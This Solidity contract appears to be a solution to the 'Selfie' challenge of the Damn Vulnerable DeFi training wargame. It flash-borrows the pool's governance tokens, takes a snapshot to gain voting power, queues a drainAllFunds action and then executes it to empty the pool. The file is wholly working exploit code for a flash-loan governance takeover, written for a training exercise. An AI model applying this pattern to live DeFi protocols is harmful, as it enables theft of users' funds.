// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
//SimpleGovernance, DamnValuableTokenSnapshot

contract SelfiePoolAttack{
    SelfiePool lender;
    SimpleGovernance governace;
    DamnValuableTokenSnapshot liquidityToken;
    uint256 actionId;
    constructor(address _lender,
                address _governance,
                address _liquidityToken) {
        lender = SelfiePool(_lender);
        governace = SimpleGovernance(_governance);
        liquidityToken = DamnValuableTokenSnapshot(_liquidityToken);
    }

    function attack() external {

        lender.flashLoan(liquidityToken.balanceOf(address(lender)));
    }

    function receiveTokens(address token, uint256 amount) external
    {
        liquidityToken.snapshot();

        bytes memory calld = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);

        actionId = governace.queueAction(address(lender), calld, 0);

        liquidityToken.transfer(address(lender), amount);
    }

    function drain() external {
        governace.executeAction(actionId);
    }
}